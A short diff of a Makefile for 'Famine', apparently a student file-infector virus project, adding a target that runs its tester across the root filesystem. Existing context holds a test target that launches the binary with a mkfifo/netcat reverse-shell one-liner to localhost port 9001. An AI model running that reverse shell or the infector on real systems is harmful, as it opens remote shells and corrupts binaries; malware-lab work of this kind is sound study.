@@ -51,6 +51,10 @@ docker:
 tester:
 	@./rsc/famine_tester.sh "/tmp/test /tmp/test2"
 
+btester:
+	@make bonus
+	@./rsc/famine_tester.sh "/"
+
 reverse_shell_test:
 	@make bonus
 	@export FAMINE_ROOT_PATH=/tmp/test && ./Famine -c1 -a 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &'
